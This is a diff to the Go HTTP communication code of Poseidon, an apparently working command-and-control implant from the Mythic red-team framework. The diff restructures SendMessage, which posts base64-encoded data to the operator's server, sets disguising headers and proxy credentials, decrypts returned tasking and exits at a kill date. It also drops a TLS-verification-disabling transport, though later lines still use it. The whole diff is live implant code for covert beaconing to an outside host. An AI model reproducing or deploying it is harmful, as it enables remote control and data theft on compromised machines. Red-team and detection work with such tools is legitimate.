@@ -5,7 +5,6 @@ package profiles
 import (
 	"bytes"
 	"crypto/rsa"
-	"crypto/tls"
 	"encoding/base64"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
@@ -252,7 +251,7 @@ func (c *C2HTTP) UpdateConfig(parameter string, value string) {
 			c.Killdate = killDateTime
 		}
 	case "Headers":
-		if err := json.Unmarshal([]byte(http_headers), &c.HeaderList); err != nil {
+		if err := json.Unmarshal([]byte(value), &c.HeaderList); err != nil {
 			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
 		}
 	}
@@ -408,16 +407,6 @@ func (c *C2HTTP) IsRunning() bool {
 	return !c.ShouldStop
 }
 
-var tr = &http.Transport{
-	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-	MaxIdleConns:      1,
-	MaxConnsPerHost:   1,
-	DisableKeepAlives: true,
-}
-var client = &http.Client{
-	Transport: tr,
-}
-
 // htmlPostData HTTP POST function
 func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
@@ -455,74 +444,88 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		today := time.Now()
 		if today.After(c.Killdate) {
 			os.Exit(1)
-		} else if req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64)); err != nil {
+		}
+		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64))
+		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
 			continue
-		} else {
-			req.ContentLength = int64(contentLength)
-			// set headers
-			for key, val := range c.HeaderList {
-				if key == "Host" {
-					req.Host = val
-				} else if key == "User-Agent" {
-					req.Header.Set(key, val)
-					tr.ProxyConnectHeader = http.Header{}
-					tr.ProxyConnectHeader.Add("User-Agent", val)
-				} else {
-					req.Header.Set(key, val)
-				}
+		}
+		req.ContentLength = int64(contentLength)
+		// set headers
+		for key, val := range c.HeaderList {
+			if key == "Host" {
+				req.Host = val
+			} else if key == "User-Agent" {
+				req.Header.Set(key, val)
+				tr.ProxyConnectHeader = http.Header{}
+				tr.ProxyConnectHeader.Add("User-Agent", val)
+			} else if key == "Content-Length" {
+				continue
+			} else {
+				req.Header.Set(key, val)
 			}
-			if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
+		}
+		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
+			req.SetBasicAuth(c.ProxyUser, c.ProxyPass)
+			/*
 				auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
 				basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
 				req.Header.Add("Proxy-Authorization", basicAuth)
-			}
-			if resp, err := client.Do(req); err != nil {
-				utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
-				IncrementFailedConnection(c.ProfileName())
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-				continue
-			} else if resp.StatusCode != 200 {
-				utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
+
+			*/
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if resp.StatusCode != 200 {
+			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		defer resp.Body.Close()
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		raw, err := base64.StdEncoding.DecodeString(string(body))
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if len(raw) < 36 {
+			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if len(c.Key) != 0 {
+			//log.Println("just did a post, and decrypting the message back")
+			enc_raw := c.decryptMessage(raw[36:])
+			if len(enc_raw) == 0 {
+				// failed somehow in decryption
+				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
 				IncrementFailedConnection(c.ProfileName())
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
 			} else {
-				defer resp.Body.Close()
-				if body, err := io.ReadAll(resp.Body); err != nil {
-					utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
-					IncrementFailedConnection(c.ProfileName())
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if raw, err := base64.StdEncoding.DecodeString(string(body)); err != nil {
-					utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
-					IncrementFailedConnection(c.ProfileName())
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if len(raw) < 36 {
-					utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
-					IncrementFailedConnection(c.ProfileName())
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if len(c.Key) != 0 {
-					//log.Println("just did a post, and decrypting the message back")
-					enc_raw := c.decryptMessage(raw[36:])
-					if len(enc_raw) == 0 {
-						// failed somehow in decryption
-						utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
-						IncrementFailedConnection(c.ProfileName())
-						time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-						continue
-					} else {
-						//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
-						return enc_raw
-					}
-				} else {
-					//fmt.Printf("response: %v\n", string(raw))
-					return raw[36:]
-				}
+				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
+				return enc_raw
 			}
+		} else {
+			//fmt.Printf("response: %v\n", string(raw))
+			return raw[36:]
 		}
+
 	}
 	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
 	return make([]byte, 0) //shouldn't get here
